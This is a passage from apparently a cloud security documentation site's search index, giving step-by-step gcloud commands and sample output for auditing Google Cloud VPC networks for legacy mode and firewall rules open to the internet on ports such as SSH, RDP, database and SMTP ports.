(highlighted). If the account has one or more roles containing *Admin or *admin, as well as the role matching Editor (i.e. \"roles/editor\") or role matching Owner (i.e. \"roles/owner\"), the selected GCP user-managed service account has administrator privileges.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/","title":"GOOGLE VPC","text":""},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#google-vpc","title":"GOOGLE VPC","text":"<p>A VPC network (Google Virtual Private Cloud network) is very similar to a physical network, except that it is virtualized within the Google Cloud Platform (GCP).</p> <p>A VPC network is a global resource that consists of a list of regional virtual subnetworks (subnets) in data centers, all connected by a global wide area network. VPC networks are logically isolated from each other in the Google Cloud Platform.</p> <p>From the above information, we have understood that it is a network that is virtualized within the Google Cloud. So there may be network vulnerabilities or misconfigurations through which malicious activities could occur in our cloud network.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-legacy-networks","title":"Check for Legacy Networks","text":"<p>Legacy network is no longer recommended for production environments because it does not support advanced networking features.</p> <p>To determine if legacy networks are being used within your Google Cloud Platform (GCP) projects, perform the following operations:</p> <p>1. So first list all the project from your google cloud .we will use the following command</p> <pre><code>  gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>In the above command, we can list the projects exists in gcloud, and the --format command is used to show the projects in a specific manner.</p> <p>2. The command output should return the requested GCP project identifiers (IDs) shown below:</p> <pre><code>PROJECT_ID\ncc-project5-stack-123456\ncc-production-app-123123\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the selected project example shown below:</p> <pre><code>NAME                                 SUBNET_MODE\ncc-web-stack-network                   LEGACY\ncc-custom-vpc-network                  CUSTOM\n</code></pre> <p>5. If the compute networks list command output lists LEGACY as the SUBNET_MODE , as shown in the example above, the cloud legacy network is being used within the selected Google Cloud Platform project.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-dns-access","title":"Check for Unrestricted DNS Access","text":"<p>Google Cloud VPC network firewall rules do not allow unrestricted access (i.e. 0.0.0.0/0) on TCP and UDP port 53 in order to reduce the attack surface and protect the virtual machine instances.</p> <p>To determine if your Google Cloud VPC firewall rules allow unrestricted access on TCP and/or UDP port 53, perform the following actions:</p> <p>1. So first list all the projects from your google cloud .we will use the following command</p> <pre><code>  gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-web-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The above command will give following output:</p> <pre><code>NAME                      DISABLED     DIRECTION          SOURCE_RANGES             ALLOW\ncc-web-allow-dns           False       INGRESS              ['0.0.0.0/0']           tcp:53\ncc-web-allow-icmp          False       INGRESS              ['0.0.0.0/0']           icmp\ncc-web-allow-ssh           False       INGRESS              ['0.0.0.0/0']           tcp:22\n</code></pre> <p>From the above output, we can see port number 53 which is not disabled.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-ftp-access","title":"Check for Unrestricted FTP Access","text":"<p>Keeping port 21 (FTP) can allow brute-force attacks, FTP bounce attacks, spoofing, and packet capture attacks.</p> <p>To determine if your Google Cloud VPC firewall rules allow unrestricted access on TCP ports 20 and 21, perform the following operations:</p> <p>1. So first list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-web-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority.</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                   DISABLED   DIRECTION   SOURCE_RANGES     ALLOW\ncc-web-allow-http      False      INGRESS     ['0.0.0.0/0']     tcp:80\ncc-web-allow-https     False      INGRESS     ['0.0.0.0/0']     tcp:443\ncc-web-allow-ftp       False      INGRESS     ['0.0.0.0/0']     tcp:21\n</code></pre> <p>From above output we can see port number 21 in not disabled.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-icmp-access","title":"Check for Unrestricted ICMP Access","text":"<p>Allowing unrestricted inbound/ingress ICMP access using VPC network firewall rules can increase opportunities for malicious activities such as Denial-of-Service (DoS) attacks, Smurf and Fraggle attacks.</p> <p>To determine if your Google Cloud VPC firewall rules allow unrestricted ICMP access, perform the following operations:</p> <p>1. So first list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-mobile-project-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-web-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority.</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                   DISABLED   DIRECTION   SOURCE_RANGES     ALLOW\ncc-app-allow-icmp      False      INGRESS     ['0.0.0.0/0']     icmp \ncc-app-allow-http      False      INGRESS     ['0.0.0.0/0']     tcp:80\ncc-app-allow-https     False      INGRESS     ['0.0.0.0/0']     tcp:443\n</code></pre> <p>From above example output we can see imcp port is not disabled.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-inbound-access-on-uncommon-ports","title":"Check for Unrestricted Inbound Access on Uncommon Ports","text":"<p>Allowing unrestricted (0.0.0.0/0) inbound access to uncommon ports via VPC network firewall rules can increase opportunities for malicious activities such as hacking, data capture, and all kinds of attacks (brute-force attacks, man-in-the-middle attack, Denial-of-Service attacks, etc).</p> <p>To determine if your Google Cloud VPC firewall rules allow unrestricted ingress access to uncommon TCP/UDP ports, perform the following operations:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-dev-project-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-app-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority.</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                         DISABLED  DIRECTION  SOURCE_RANGES  ALLOW\ncc-allow-ica-access          False     INGRESS    ['0.0.0.0/0']  tcp:1494\ncc-allow-ws-console-access   False     INGRESS    ['0.0.0.0/0']  tcp:8010\ncc-allow-ws-database-access  False     INGRESS    ['0.0.0.0/0']  tcp:1433\ncc-allow-http-access         False     INGRESS    ['0.0.0.0/0']  tcp:80\n</code></pre> <p>Check the compute firewall-rules list command output for any enabled firewall rules (i.e. DISABLED attribute set to False) with the DIRECTION set to INGRESS, SOURCE_RANGES set to ['0.0.0.0/0'], and ALLOW set to an uncommon TCP/UDP port (e.g. TCP 1494). If one or more rules match the search criteria, there are VPC network firewall rules that allow unrestricted inbound/ingress access to uncommon ports, therefore the access to the associated virtual machine (VM) instances is not secured (restricted).</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-mysql-database-access","title":"Check for Unrestricted MySQL Database Access","text":"<p>Allowing unrestricted ingress access on TCP port 3306 (MySQL Database Server) through VPC network firewall rules can increase opportunities for malicious activities such as brute-force or bypass authentication attacks, and SQL injection attacks.</p> <p>To determine if your Google Cloud VPC firewall rules allow unrestricted access on TCP port 3306, perform the following actions:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-web-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority.</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                   DISABLED   DIRECTION   SOURCE_RANGES     ALLOW\ncc-web-allow-mysql     False      INGRESS     ['0.0.0.0/0']     tcp:3306\ncc-web-allow-https     False      INGRESS     ['0.0.0.0/0']     tcp:443\n</code></pre> <p>Check the compute firewall-rules list command output for any active firewall rules  with the DIRECTION set to INGRESS, SOURCE_RANGES set to ['0.0.0.0/0'], and ALLOW set to tcp:3306 or tcp:0-65535. If one or more rules match the search criteria, there are VPC network firewall rules that allow unrestricted access on TCP port 3306, therefore the MySQL database access to the associated Google Cloud VM instances is not restricted/secured.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-oracle-database-access","title":"Check for Unrestricted Oracle Database Access","text":"<p>Allowing unrestricted ingress/inbound access on TCP port 1521 through VPC network firewall rules can increase opportunities for malicious activities such as denial-of-service attacks, brute-force and man-in-the-middle (MITM) attacks, and can ultimately lead to data loss. VPC firewall rules should be configured so that access to specific resources is restricted to just those hosts or networks that have a legitimate business requirement for access.</p> <p>To determine if your Google Cloud VPC firewall rules allow unrestricted access on TCP port 1521, perform the following actions:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-web-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority.</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                   DISABLED   DIRECTION   SOURCE_RANGES     ALLOW\ncc-web-allow-http      False      INGRESS     ['0.0.0.0/0']     tcp:80\ncc-web-allow-https     False      INGRESS     ['0.0.0.0/0']     tcp:443\ncc-web-allow-oracle    False      INGRESS     ['0.0.0.0/0']     tcp:1521\n</code></pre> <p>Check the compute firewall-rules list command output for any active firewall rules with the DIRECTION set to INGRESS, SOURCE_RANGES set to ['0.0.0.0/0'], and ALLOW set to tcp:3306 or tcp:0-65535. If one or more rules match the search criteria, there are VPC network firewall rules that allow unrestricted access on TCP port 3306, therefore the MySQL database access to the associated Google Cloud VM instances is not restricted/secured.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-outbound-access-on-all-ports","title":"Check for Unrestricted Outbound Access on All Ports","text":"<p>Allowing unrestricted outbound/egress access on all TCP/UDP ports can increase opportunities for malicious activities such as Distributed Denial of Service (DDoS) attacks.</p> <p>To determine if your Google Cloud VPC firewall rules allow unrestricted outbound access on all ports, perform the following actions:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-web-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                   DISABLED  DIRECTION  DESTINATION_RANGES  ALLOW\ncc-allow-http-access   False     EGRESS     ['0.0.0.0/0']       tcp:80\ncc-allow-https-access  False     EGRESS     ['0.0.0.0/0']       tcp:443\ncc-allow-wide-access   False     EGRESS     ['0.0.0.0/0']       tcp:0-65535\n</code></pre> <p>Check the compute firewall-rules list command output for any active firewall rules  with the DIRECTION set to EGRESS, DESTINATION_RANGES set to ['0.0.0.0/0'], and ALLOW set to tcp:0-65535 or udp:0-65535. If one or more rules match the search criteria, there are VPC network firewall rules that allow unrestricted outbound traffic on any TCP/UDP port from the associated Google Cloud resources.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-postgresql-database-access","title":"Check for Unrestricted PostgreSQL Database Access","text":"<p>Allowing unrestricted inbound access on TCP port 5432 (PostgreSQL Database) via VPC network firewall rules can increase opportunities for malicious activities such as hacking, brute-force attacks, DDoS, and SQL injection attacks.</p> <p>To determine if your Google Cloud VPC firewall rules allow unrestricted access on TCP port 5432, perform the following operations:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-web-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                   DISABLED   DIRECTION   SOURCE_RANGES     ALLOW\ncc-app-allow-http      False      INGRESS     ['0.0.0.0/0']     tcp:80\ncc-app-allow-https     False      INGRESS     ['0.0.0.0/0']     tcp:443\ncc-app-allow-postgres  False      INGRESS     ['0.0.0.0/0']     tcp:5432\n</code></pre> <p>Check the compute firewall-rules list command output for any enabled firewall rules  with the DIRECTION set to INGRESS, SOURCE_RANGES set to ['0.0.0.0/0'], and ALLOW set to tcp:5432 or tcp:0-65535. If one or more rules match the search criteria, there are VPC network firewall rules that allow unrestricted access on TCP port 5432, therefore the PostgreSQL-based access to the associated Google Cloud resources is not restricted/secured.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-rdp-access","title":"Check for Unrestricted RDP Access","text":"<p>Allowing unrestricted Remote Desktop Protocol (RDP) access can increase opportunities for malicious activities such as hacking, Man-In-The-Middle attacks (MITM) and Pass-The-Hash (PTH) attacks.</p> <p>To determine if your VPC firewall rules allow unrestricted access on TCP port 3389 (RDP), perform the following actions:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-web-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                   DISABLED  DIRECTION  SOURCE_RANGES     ALLOW\ncc-app-allow-rdp       False     INGRESS    ['0.0.0.0/0']     tcp:3389\ncc-app-allow-internal  False     INGRESS    ['10.105.0.0/9']  tcp:0-65535,udp:0-65535\n</code></pre> <p>Check the compute firewall-rules list command output for any enabled firewall rules with the DIRECTION set to INGRESS, SOURCE_RANGES set to ['0.0.0.0/0'], and ALLOW set to tcp:3389 or tcp:0-65535. If one or more rules match the search criteria, there are VPC firewall rules that allow unrestricted access on TCP port 3389, defined for the selected VPC, therefore the RDP access to the associated Google Cloud Windows instances is not secured.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-rpc-access","title":"Check for Unrestricted RPC Access","text":"<p>Allowing unrestricted ingress/inbound access on TCP port 135 (RPC) through VPC network firewall rules can increase opportunities for malicious activities such as hacking (e.g. backdoor command shell), ransomware attacks, and Denial-of-Service (DoS) attacks. </p> <p>To determine if your Google Cloud VPC firewall rules allow unrestricted access on TCP port 135, perform the following actions:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-mobile-project-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-web-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority.</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                   DISABLED   DIRECTION   SOURCE_RANGES     ALLOW\ncc-web-allow-rdp       False      INGRESS     ['0.0.0.0/0']     tcp:3389\ncc-web-allow-rpc       False      INGRESS     ['0.0.0.0/0']     tcp:135\n</code></pre> <p>Check the compute firewall-rules list command output for any active firewall rules  with the DIRECTION set to INGRESS, SOURCE_RANGES set to ['0.0.0.0/0'], and ALLOW set to tcp:135 or tcp:0-65535. If one or more rules match the search criteria, there are VPC network firewall rules that allow unrestricted access on TCP port 135, therefore the RPC-based access to the associated Google Cloud VM instances is not restricted/secured.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-smtp-access","title":"Check for Unrestricted SMTP Access","text":"<p>Allowing unrestricted inbound/ingress access on TCP port 25 (SMTP) using VPC network firewall rules can increase opportunities for malicious activities such as hacking, spamming, Shellshock and Distributed Denial-of-Service (DDoS) attacks.</p> <p>To determine if your Google Cloud VPC firewall rules allow unrestricted access on TCP port 25, perform the following operations:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-web-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                   DISABLED   DIRECTION   SOURCE_RANGES     ALLOW\ncc-app-allow-smtp      False      INGRESS     ['0.0.0.0/0']     tcp:25 \ncc-app-allow-http      False      INGRESS     ['0.0.0.0/0']     tcp:80\ncc-app-allow-https     False      INGRESS     ['0.0.0.0/0']     tcp:443\n</code></pre> <p>Check the compute firewall-rules list command output for any enabled firewall rules  with the DIRECTION set to INGRESS, SOURCE_RANGES set to ['0.0.0.0/0'], and ALLOW set to tcp:25 or tcp:0-65535. If one or more rules match the search criteria, there are VPC network firewall rules that allow unrestricted access on TCP port 25, therefore the SMTP access granted to the associated Google Cloud resources is not restricted or secured.\\</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-sql-server-access","title":"Check for Unrestricted SQL Server Access","text":"<p>Allowing unrestricted inbound/ingress access on TCP port 1433 (Microsoft SQL Server) via VPC network firewall rules can increase opportunities for malicious activities such as hacking, brute-force attacks, and SQL injection attacks.</p> <p>To determine if your Google Cloud VPC firewall rules allow unrestricted access on TCP port 1433, perform the following operations:</p> <p>1. First list all the projects from your google cloud .we will use the following command.</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-web-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority.</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                   DISABLED   DIRECTION   SOURCE_RANGES     ALLOW\ncc-app-allow-rdp       False      INGRESS     ['0.0.0.0/0']     tcp:3389\ncc-app-allow-mssql     False      INGRESS     ['0.0.0.0/0']     tcp:1433\n</code></pre> <p>Check the compute firewall-rules list command output for any enabled firewall rules with the DIRECTION set to INGRESS, SOURCE_RANGES set to ['0.0.0.0/0'], and ALLOW set to tcp:1433 or tcp:0-65535. If one or more rules match the search criteria, there are VPC network firewall rules that allow unrestricted access on TCP port 1433, therefore the SQL Server access granted to the associated Google Cloud resources is not restricted/secured.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-unrestricted-ssh-access","title":"Check for Unrestricted SSH Access","text":"<p>Exposing Secure Shell (SSH) port 22 to the Internet can increase opportunities for malicious activities such as hacking, Man-In-The-Middle attacks (MITM) and brute-force attacks, therefore it is strongly recommended to configure your Google Cloud VPC firewall rules to limit inbound traffic on TCP port 22 to known IP addresses only.</p> <p>To determine if your VPC firewall rules allow unrestricted access on TCP port 22 (SSH), perform the following operations:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-app-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority.</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The command output should return the information available for the existing VPC firewall rules:</p> <pre><code>NAME                   DISABLED  DIRECTION  SOURCE_RANGES     ALLOW\ncc-web-allow-icmp      True      INGRESS    ['0.0.0.0/0']     icmp\ncc-web-allow-internal  False     INGRESS    ['10.128.0.0/9']  tcp:0-65535,udp:0-65535,icmp\ncc-web-allow-ssh       False     INGRESS    ['0.0.0.0/0']     tcp:22\n</code></pre> <p>Check the compute firewall-rules list command output for any enabled firewall rules  with the DIRECTION set to INGRESS, SOURCE_RANGES set to ['0.0.0.0/0'], and ALLOW set to tcp:22 or tcp:0-65535. If one or more rules match the search criteria, there are VPC firewall rules that allow unrestricted access on TCP port 22, defined for the selected VPC, therefore the SSH access to the associated Google Cloud VM instances is not secured.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#check-for-vpc-firewall-rules-with-port-ranges","title":"Check for VPC Firewall Rules with Port Ranges","text":"<p>Opening range of ports within your VPC network firewall rules is not a good practice because it can allow attackers to use port scanners and other probing techniques to identify services running on your instances and exploit their vulnerabilities.</p> <p>To determine if your VPC network firewall rules are using range of ports to allow inbound traffic, perform the following operations:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-dev-project-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-app-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority.</p> <pre><code>gcloud compute firewall-rules list --filter network=&lt;VPC network name&gt;  --sort-by priority --    format=table\"(name,disabled,direction,sourceRanges,allowed[].map().firewall_rule().list())\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                 DISABLED  DIRECTION  SOURCE_RANGES  ALLOW\nnetwork-allow-http   False     INGRESS    ['0.0.0.0/0']  tcp:80\nnetwork-allow-https  False     INGRESS    ['0.0.0.0/0']  tcp:0-65535\n</code></pre> <p>Check the compute firewall-rules list command output for any enabled firewall rules  with the DIRECTION set to INGRESS and ALLOW set to a range or ports such as tcp:0-65535 and tcp:80-8080. If one or more rules match the search criteria, there are VPC network firewall rules that are using range of ports to allow inbound traffic, therefore the access to the associated cloud resources is not secured (restricted).</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#default-vpc-network-in-use","title":"Default VPC Network In Use","text":"<p>A default VPC might be suitable for getting started quickly with your GCP project, however, when you deploy complex, production applications and use multi-tier architectures, you may need to keep parts of your network private or customize the network model, 